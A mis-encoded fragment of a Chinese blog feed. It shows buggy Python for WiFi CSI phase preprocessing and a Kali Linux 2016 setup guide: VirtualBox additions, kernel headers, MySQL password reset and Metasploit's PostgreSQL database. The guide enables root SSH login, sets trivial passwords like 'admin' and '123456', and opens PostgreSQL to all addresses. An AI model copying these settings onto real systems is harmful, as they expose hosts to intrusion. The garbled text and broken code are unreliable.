title="æ•°æ®é¢„å¤„ç†"></a>æ•°æ®é¢„å¤„ç†</h4><p>ä¸ºäº†é¿å…ç›¸ä½çš„åç§»çš„å½±å“ï¼Œéœ€è¦å°†ç›¸ä½è¿›è¡Œçº¿æ€§å˜æ¢ï¼Œå‚è€ƒè®ºæ–‡ï¼Œå†™å‡ºäº†ä»¥ä¸‹Pythonä»£ç :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">N = <span class="number">1000</span> <span class="comment"># Nä¸ºé‡‡é›†çš„æ•°æ®åŒ…æ•°é‡</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">complexDecoding</span><span class="params">(raw_data)</span>:</span></span><br><span class="line">â€œâ€â€</span><br><span class="line">å°†åŸå§‹æ•°æ®è½¬åŒ–ä¸ºPythonå¯è¯†åˆ«çš„å¤æ•°</span><br><span class="line">è¿™é‡Œä½¿ç”¨äº†ç¬¬ä¸€ä¸ªå¤©çº¿çš„æ•°æ®raw_data[<span class="number">0</span>]</span><br><span class="line">ç¬¬äºŒæ ¹ç¬¬ä¸‰æ ¹å¤©çº¿æ•°æ®ä¸‹æ ‡åˆ†åˆ«ä¸º<span class="number">1</span>, <span class="number">2</span></span><br><span class="line">åŸå§‹æ•°æ®ä¸ºa + bi, pythonä¸ºa + bj</span><br><span class="line">è¿”å›å¤„ç†åçš„æ•°æ®</span><br><span class="line">â€œâ€â€</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(N):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>): <span class="comment"># 30 ä»£è¡¨å­è½½æ³¢æ•°é‡ï¼Œå›ºå®šä¸º30</span></span><br><span class="line"><span class="keyword">if</span> raw_data[<span class="number">0</span>][<span class="number">-1</span>] == â€˜iâ€™:</span><br><span class="line">data.append(complex(raw_data[<span class="number">0</span>][:<span class="number">-1</span>]+â€˜jâ€™))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">data.append(complex(raw_data[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAP</span><span class="params">(data)</span>:</span></span><br><span class="line">â€œâ€â€</span><br><span class="line">æ ¹æ®å¤æ•°è®¡ç®—æŒ¯å¹…å’Œç›¸ä½</span><br><span class="line">â€œâ€â€</span><br><span class="line">amplitudes = [([] * <span class="number">30</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(N)]</span><br><span class="line">phases = [([] * <span class="number">30</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(N)]</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(N):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">r = sqrt((data[i + m * <span class="number">30</span>].real) ** <span class="number">2</span> + (data[i + m * <span class="number">30</span>].imag) ** <span class="number">2</span>)</span><br><span class="line">amplitudes[m].append(r)</span><br><span class="line">phases[m].append(np.angle(data[i + m * <span class="number">30</span>]))</span><br><span class="line"><span class="keyword">return</span> (amplitudes, phases)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocessingPhase</span><span class="params">(phases)</span>:</span></span><br><span class="line">â€œâ€â€</span><br><span class="line">å°†ç›¸ä½è¿›è¡Œçº¿æ€§å˜æ¢</span><br><span class="line">indexæ˜¯ <span class="number">-28</span> åˆ° <span class="number">28</span> æ ¹æ® IEEE <span class="number">802.11</span>n åè®®</span><br><span class="line">è¿”å›å˜æ¢åçš„ç›¸ä½</span><br><span class="line">â€œâ€â€</span><br><span class="line">index = range(<span class="number">-28</span>,<span class="number">0</span>,<span class="number">2</span>) + [<span class="number">-1</span>, <span class="number">1</span>] + range(<span class="number">3</span>,<span class="number">28</span>, <span class="number">2</span>) + [<span class="number">28</span>]</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(N):</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">clear = <span class="literal">True</span></span><br><span class="line">base = <span class="number">0</span></span><br><span class="line">tphases[m][<span class="number">0</span>] = phases[m][<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line"><span class="keyword">if</span> phases[m][i] â€“ phases[m][i<span class="number">-1</span>] &gt; pi:</span><br><span class="line">base += <span class="number">1</span></span><br><span class="line">clear = <span class="literal">False</span></span><br><span class="line"><span class="keyword">elif</span> phases[m][i] â€“ phases[m][i<span class="number">-1</span>] &lt; -pi:</span><br><span class="line">base â€“= <span class="number">1</span></span><br><span class="line">clear = <span class="literal">False</span></span><br><span class="line">tphases[m][i] = phases[m][i] â€“ <span class="number">2</span> * pi * base</span><br><span class="line"><span class="keyword">if</span> clear == <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">phases[m][i] = tphases[m][i] â€“ (tphases[m][<span class="number">29</span>] â€“ tphases[m][<span class="number">0</span>])</span><br><span class="line">* <span class="number">1.0</span> /(<span class="number">28</span> â€“ (<span class="number">-28</span>)) * (index[i])</span><br><span class="line">â€“ <span class="number">1.0</span> / <span class="number">30</span> * sum([tphases[m][j] <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>)])</span><br><span class="line"><span class="keyword">return</span> phases</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒè®ºæ–‡"><a href="#å‚è€ƒè®ºæ–‡" class="headerlink" title="å‚è€ƒè®ºæ–‡"></a>å‚è€ƒè®ºæ–‡</h4><ol><li>PADS Passive Detection of Moving Targets with Dynamic Speed using PHY Layer Information</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;ç¯å¢ƒå®‰è£…&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒå®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒå®‰è£…&quot;&gt;&lt;/a&gt;ç¯å¢ƒå®‰è£…&lt;/h4&gt;&lt;p&gt;éœ€è¦ç”¨åˆ°&lt;a href=&quot;http://dhalperi.github.io/linux-80211n-csitool/&quot; 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kali linux 2016 ä½¿ç”¨æŒ‡å—(äºŒ)</title>
    <link href="http://zer0yu.github.io/2017/01/21/kali-linux-2016-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%BA%8C/"/>
    <id>http://zer0yu.github.io/2017/01/21/kali-linux-2016-ä½¿ç”¨æŒ‡å—-äºŒ/</id>
    <published>2017-01-21T14:11:00.000Z</published>
    <updated>2018-05-13T14:03:59.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="è™šæ‹Ÿæœºå®‰è£…å¢å¼º"><a href="#è™šæ‹Ÿæœºå®‰è£…å¢å¼º" class="headerlink" title="è™šæ‹Ÿæœºå®‰è£…å¢å¼º"></a>è™šæ‹Ÿæœºå®‰è£…å¢å¼º</h4><h5 id="1-Kali-å®˜æ–¹å®‰è£…"><a href="#1-Kali-å®˜æ–¹å®‰è£…" class="headerlink" title="1.Kali å®˜æ–¹å®‰è£…"></a>1.Kali å®˜æ–¹å®‰è£…</h5><p>æ›´æ–° /etc/apt/sources.list</p><p>ä½ æ‰€æ·»åŠ çš„æºï¼Œè¯·ç¡®ä¿æ˜¯æˆ‘åœ¨ä¸€ä¸­å†™çš„æ‰€æœ‰</p><p>ç„¶ååœ¨çº¿å®‰è£…å¢å¼ºåŠŸèƒ½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line">apt-get install -y virtualbox-guest-x11</span><br><span class="line"></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><h5 id="2-VirtualBoxè‡ªå¸¦åŒ…å®‰è£…"><a href="#2-VirtualBoxè‡ªå¸¦åŒ…å®‰è£…" class="headerlink" title="2.VirtualBoxè‡ªå¸¦åŒ…å®‰è£…"></a>2.VirtualBoxè‡ªå¸¦åŒ…å®‰è£…</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install -y linux-headers-$(uname-r)</span><br><span class="line"></span><br><span class="line">cp /media/cd-rom/VBoxLinuxAdditions.run /root/</span><br><span class="line"></span><br><span class="line">chmod 755 /root/VBoxLinuxAdditions.run</span><br><span class="line"></span><br><span class="line">cd/root</span><br><span class="line"></span><br><span class="line">./VBoxLinuxAdditions.run</span><br></pre></td></tr></table></figure><h4 id="å†…æ ¸å¤´æœ‰é—®é¢˜è‡ªå·±æ‰‹åŠ¨å®‰è£…è¿‡ç¨‹"><a href="#å†…æ ¸å¤´æœ‰é—®é¢˜è‡ªå·±æ‰‹åŠ¨å®‰è£…è¿‡ç¨‹" class="headerlink" title="å†…æ ¸å¤´æœ‰é—®é¢˜è‡ªå·±æ‰‹åŠ¨å®‰è£…è¿‡ç¨‹"></a>å†…æ ¸å¤´æœ‰é—®é¢˜è‡ªå·±æ‰‹åŠ¨å®‰è£…è¿‡ç¨‹</h4><p>æ‰“å¼€ <a href="http://http.kali.org/kali/pool/main/l/linux/%20" target="_blank" rel="noopener">http://http.kali.org/kali/pool/main/l/linux/</a></p><p>ä¸‹è½½å¯¹åº”è‡ªå·±å†…æ ¸ç‰ˆæœ¬çš„ linux-kbuild</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">wget http://http.kali.org/kali/pool/main/l/linux/linux-kbuild-4.6_4.6.4-1kali1_amd64.deb</span><br><span class="line"></span><br><span class="line">dpkg -i linux-kbuild-4.6_4.6.4-1kali1_amd64.deb</span><br><span class="line"></span><br><span class="line">wget http://http.kali.org/kali/pool/main/l/linux/linux-headers-4.6.0-kali1-common_4.6.4-1kali1_amd64.deb</span><br><span class="line"></span><br><span class="line">wget http://http.kali.org/kali/pool/main/l/linux/http://http.kali.org/kali/pool/main/l/linux/linux-headers-4.6.0-kali1-amd64_4.6.4-1kali1_amd64.deb</span><br><span class="line"></span><br><span class="line">dpkg -i linux-headers-4.6.0-kali1-common_4.6.4-1kali1_amd64.deb</span><br><span class="line"></span><br><span class="line">dpkg -i linux-headers-4.6.0-kali1-amd64_4.6.4-1kali1_amd64.deb</span><br><span class="line"></span><br><span class="line">apt-get -f install</span><br></pre></td></tr></table></figure><h4 id="å¼€å¯SSHæœåŠ¡"><a href="#å¼€å¯SSHæœåŠ¡" class="headerlink" title="å¼€å¯SSHæœåŠ¡"></a>å¼€å¯SSHæœåŠ¡</h4><p>é¦–å…ˆï¼šç¼–è¾‘sshd_configæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>å…¶æ¬¡ï¼šå°†sshd_configæ–‡ä»¶ä¸­çš„è¯­å¥PermitRootLogin prohibit-passwordä¿®æ”¹ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin yes</span><br></pre></td></tr></table></figure><p>å†æ¬¡ï¼šä½¿ç”¨å‘½ä»¤å¯åŠ¨SSHæœåŠ¡:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh start</span><br><span class="line"># æˆ–è€…</span><br><span class="line">service ssh start</span><br></pre></td></tr></table></figure><p>æœ€åï¼šè®¾ç½®ç³»ç»Ÿå¼€æœºè‡ªåŠ¨å¯åŠ¨SSHæœåŠ¡:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d ssh enable  //ç³»ç»Ÿè‡ªåŠ¨å¯åŠ¨SSHæœåŠ¡</span><br></pre></td></tr></table></figure><h4 id="mysqlé‡ç½®å¯†ç "><a href="#mysqlé‡ç½®å¯†ç " class="headerlink" title="mysqlé‡ç½®å¯†ç "></a>mysqlé‡ç½®å¯†ç </h4><p>1ã€å¦‚æœ<a href="http://lib.csdn.net/base/linux" target="_blank" rel="noopener">Linux</a>ä¸­æœªå®‰è£…<a href="http://lib.csdn.net/base/mysql" target="_blank" rel="noopener">MySQL</a>ï¼Œåˆ™éœ€è¦ä¸‹è½½å®‰è£…ï¼Œ<strong>åœ¨å®‰è£…çš„è¿‡ç¨‹ä¸­ä¼šè¦æ±‚è¾“å…¥ç”¨æˆ·åå¯†ç </strong>ï¼Œåˆ™æ— éœ€é‡ç½®ï¼Œç›´æ¥è®¾ç½®</p><p>2ã€MySQLè®¾ç½®UTF-8ç¼–ç æ ¼å¼**</p><p>é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# vim /etc/mysql/my.cnf</span><br></pre></td></tr></table></figure><p>æ·»åŠ é»˜è®¤utf-8ç¼–ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[client]</span><br><span class="line">default-character-set = utf8</span><br><span class="line">[mysqld]</span><br><span class="line">default-storage-engine = INNODB</span><br><span class="line">character-set-server = utf8</span><br><span class="line">collation-server = utf8_general_ci</span><br></pre></td></tr></table></figure><p>3ã€æ›´æ–°MySQLçš„ç”¨æˆ·åå¯†ç </p><p>é¦–å…ˆæŸ¥çœ‹MySQLæ˜¯å¦è¿è¡Œï¼Œç¡®ä¿MySQLæ˜¯stopçŠ¶æ€ï¼Œå¯ä»¥ä½¿ç”¨/etc/init.d/mysql stopåœæ­¢è¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# /etc/init.d/mysql status</span><br><span class="line">[info] MySQL is stopped..</span><br></pre></td></tr></table></figure><p>ç„¶åå¯åŠ¨MySQLçš„server/daemon process</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# mysqld_safe â€“skip-grant-tables &amp;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨rootç”¨æˆ·è¿æ¥MySQL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# mysql -u root</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 1</span><br><span class="line">Server version: 5.5.44â€“0+deb7u1 (Debian)</span><br><span class="line">Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line">Type â€˜help;â€™ or â€˜\hâ€™ for help. Type â€˜\câ€™ to clear the current input statement.</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p>æ›´æ”¹rootç”¨æˆ·çš„å¯†ç ä¸ºadmin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; update user set password=PASSWORD(â€˜adminâ€™) where User=â€˜rootâ€™;</span><br><span class="line">Query OK, 4 rows affected (0.01 sec)</span><br><span class="line">Rows matched: 4  Changed: 4  Warnings: 0</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œæ›´æ–°å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure><p>flush privileges å‘½ä»¤æœ¬è´¨ä¸Šçš„ä½œç”¨æ˜¯å°†å½“å‰userå’Œpriviligeè¡¨ä¸­çš„ç”¨æˆ·ä¿¡æ¯/æƒé™è®¾ç½®ä»mysqlåº“(MySQLæ•°æ®åº“çš„å†…ç½®åº“)ä¸­æå–åˆ°å†…å­˜é‡Œã€‚MySQLç”¨æˆ·æ•°æ®å’Œæƒé™æœ‰ä¿®æ”¹åï¼Œå¸Œæœ›åœ¨â€ä¸é‡å¯MySQLæœåŠ¡â€çš„æƒ…å†µä¸‹ç›´æ¥ç”Ÿæ•ˆï¼Œé‚£ä¹ˆå°±éœ€è¦æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ã€‚é€šå¸¸æ˜¯åœ¨ä¿®æ”¹ROOTå¸å·çš„è®¾ç½®åï¼Œæ€•é‡å¯åæ— æ³•å†ç™»å½•è¿›æ¥ï¼Œé‚£ä¹ˆç›´æ¥flushä¹‹åå°±å¯ä»¥çœ‹æƒé™è®¾ç½®æ˜¯å¦ç”Ÿæ•ˆã€‚è€Œä¸å¿…å†’å¤ªå¤§é£é™©ã€‚</p><p>é€€å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; quit</span><br></pre></td></tr></table></figure><p>4ã€éªŒè¯ç”¨æˆ·å¯†ç æ˜¯å¦æ›´æ–°æˆåŠŸ</p><p>é‡å¯MySQL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# /etc/init.d/mysql restart</span><br><span class="line">[ ok ] Stopping MySQL database server: mysqld.</span><br><span class="line">[â€¦.] Starting MySQL database server: mysqld151015 11:41:36 mysqld_safe mysqld from pid file /var/run/mysqld/mysqld.pid ended</span><br><span class="line">[ .k</span><br><span class="line">[info] Checking for tables which need an upgrade, are corrupt or were</span><br><span class="line">not closed cleanly..</span><br><span class="line">[1]+  å®Œæˆ                  mysqld_safe â€“skip-grant-tables</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨rootç”¨æˆ·è¿æ¥MySQL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# mysql -u root -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 43</span><br><span class="line">Server version: 5.5.44â€“0+deb7u1 (Debian)</span><br><span class="line">Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line">Type â€˜help;â€™ or â€˜\hâ€™ for help. Type â€˜\câ€™ to clear the current input statement.</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><h4 id="metasploit-Database-not-connecté—®é¢˜è§£å†³"><a href="#metasploit-Database-not-connecté—®é¢˜è§£å†³" class="headerlink" title="metasploit Database not connecté—®é¢˜è§£å†³"></a>metasploit Database not connecté—®é¢˜è§£å†³</h4><p>1ã€postgresqlæ˜¯æœ¬èº«æ²¡æœ‰å¯åŠ¨çš„ã€‚æ‰€ä»¥éœ€è¦å¯åŠ¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start</span><br></pre></td></tr></table></figure><p>2ã€é€šè¿‡å‘½ä»¤è¿›å…¥é…ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u postgres psql</span><br><span class="line">ALTER USER postgres WITH PASSWORD â€˜123.comâ€™;</span><br></pre></td></tr></table></figure><p>æ³¨æ„1ï¼šâ€˜123.comâ€™è¿™ä¸ªæ˜¯å¯†ç ã€‚<br>æ³¨æ„2ï¼šåˆ†å·ï¼ï¼ï¼ï¼ä¸€å®šè¦å¸¦ä¸Šåˆ†å·â€œï¼›â€ã€‚<br>æ³¨æ„3ï¼š\qï¼šé€€å‡ºæ•°æ®åº“</p><p>3ã€ä¿®æ”¹linuxç³»ç»Ÿçš„postgresç”¨æˆ·çš„å¯†ç ï¼ˆå¯†ç ä¸æ•°æ®åº“ç”¨æˆ·postgresçš„å¯†ç ç›¸åŒï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sudo passwd -d postgres</span><br><span class="line">passwdï¼šå¯†ç è¿‡æœŸä¿¡æ¯å·²æ›´æ”¹ã€‚</span><br><span class="line">root@kali:~# sudo -u postgres passwd</span><br><span class="line">è¾“å…¥æ–°çš„ UNIX å¯†ç ï¼š</span><br><span class="line">é‡æ–°è¾“å…¥æ–°çš„ UNIX å¯†ç ï¼š</span><br><span class="line">passwdï¼šå·²æˆåŠŸæ›´æ–°å¯†ç </span><br></pre></td></tr></table></figure><p>4ã€ä¿®æ”¹PostgresSQLæ•°æ®åº“é…ç½®å®ç°è¿œç¨‹è®¿é—®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# vi /etc/postgresql/9.4/main/postgresql.conf</span><br><span class="line">æ›´æ”¹#listen_addresses = â€˜localhostâ€™ä¸º listen_addresses = â€˜*â€™</span><br><span class="line">æ›´æ”¹#password_encryption = onä¸ºpassword_encryption = on</span><br><span class="line">root@kali:~# vi /etc/postgresql/9.4/main/pg_hba.conf</span><br><span class="line">åœ¨æ–‡æ¡£æœ«å°¾åŠ ä¸Šä»¥ä¸‹å†…å®¹</span><br><span class="line"># to allow your client visiting postgresql server</span><br><span class="line">host all all 0.0.0.0 0.0.0.0 md5</span><br><span class="line">root@kali:~# service postgresql restart</span><br></pre></td></tr></table></figure><p>æ³¨æ„1ï¼šâ€œ#â€å·ï¼Œä¸€å®šè¦æŠŠâ€œ#â€åˆ é™¤æ‰ã€‚<br>æ³¨æ„2ï¼šåœ¨viç¼–è¾‘æ¨¡å¼ä¸‹ç‚¹å‡»é”®ç›˜å­—æ¯aæ˜¯è¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼Œç¼–è¾‘å®Œæˆåç‚¹å‡»â€œescâ€é€€å‡ºç¼–è¾‘æ¨¡å¼ç„¶ååœ¨æœ€ä¸‹æ–¹è¾“å…¥â€œï¼šwqâ€ä¿å­˜å¹¶é€€å‡ºã€‚</p><p>5ã€ç®¡ç†PostgreSQLç”¨æˆ·å’Œæ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# psql -U postgres -h 127.0.0.1</span><br></pre></td></tr></table></figure><p>ç”¨æˆ· postgres çš„å£ä»¤ï¼š<br>psql (9.4.6)<br>SSLè¿æ¥ (åè®®: TLSv1.2, åŠ å¯†ï¼šECDHE-RSA-AES256-GCM-SHA384ï¼ŒäºŒè¿›åˆ¶ä½: 256, å‹ç¼©æ¯”: å…³é—­)<br>è¾“å…¥ â€œhelpâ€ æ¥è·å–å¸®åŠ©ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">postgres=# create user â€œmsf123â€ with password â€˜123456â€™ nocreatedb;</span><br><span class="line">CREATE ROLE</span><br><span class="line">postgres=# create database â€œmsf1â€ with owner=â€msf123â€;</span><br><span class="line">ERROR: role â€œâ€msf123â€â€ does not exist</span><br><span class="line">postgres=# create database â€œmsf1â€³ with owner=â€msf123â€;</span><br><span class="line">CREATE DATABASE</span><br><span class="line">postgres=# \q</span><br></pre></td></tr></table></figure><p>æ³¨æ„1ï¼šè¿˜æ˜¯è¦æ³¨æ„åˆ†å·ï¼ï¼ï¼æ²¡æœ‰åˆ†å·å‘½ä»¤å°±æ— æ³•æ‰§è¡Œã€‚<br>æ³¨æ„2ï¼šæ³¨æ„å¤åˆ¶çš„æ—¶å€™â€œâ€ç¬¦å·é—®é¢˜ã€‚<br>æ³¨æ„3ï¼šuseråé¢æ˜¯ç”¨æˆ·åï¼Œpasswordåé¢æ˜¯ç”¨æˆ·åå¯¹åº”çš„å¯†ç ã€‚<br>æ³¨æ„4ï¼šå‘½ä»¤æ‰§è¡Œåæœ‰è¿”å›ç»“æœæ‰æ˜¯æ‰§è¡ŒæˆåŠŸäº†ã€‚</p><p>6ã€msfé…ç½®è¿æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole</span><br><span class="line">msf &gt; db_status</span><br><span class="line">[*] postgresql selected, no connection</span><br><span class="line">msf &gt; db_connect msf123:123456@127.0.0.1/msf1</span><br><span class="line">[*] Rebuilding the module cache in the backgroundâ€¦</span><br><span class="line">msf &gt; db_status</span><br><span class="line">[*] postgresql connected to msf1</span><br><span class="line">msf &gt;</span><br></pre></td></tr></table></figure><p>åœ¨msfå¯åŠ¨åè¿æ¥æ•°æ®åº“å°±å¥½ã€‚<br>æ³¨æ„1ï¼šâ€œmsf123:123456â€è¿™ä¸ªæ˜¯æ­¥éª¤5ä¸­çš„<br>â€œcreate user â€œmsf123â€ with password â€˜123456â€™ nocreatedb;â€æ‰€å»ºç«‹çš„ã€‚<br>â€œ127.0.0.1â€æ˜¯æŒ‡æœ¬æœºã€‚<br>â€œmsf1â€è¿™ä¸ªæ˜¯åº“åã€‚<br>æ³¨æ„2ï¼šâ€œ[*] postgresql connected to msf1â€è¿™ä¸ªæ˜¯è¯´æ˜ä»¥é“¾æ¥æˆåŠŸæ•°æ®åº“ã€‚</p><h4 id="kali-linux-apt-get-è¯ä¹¦æ ¡éªŒé”™è¯¯"><a 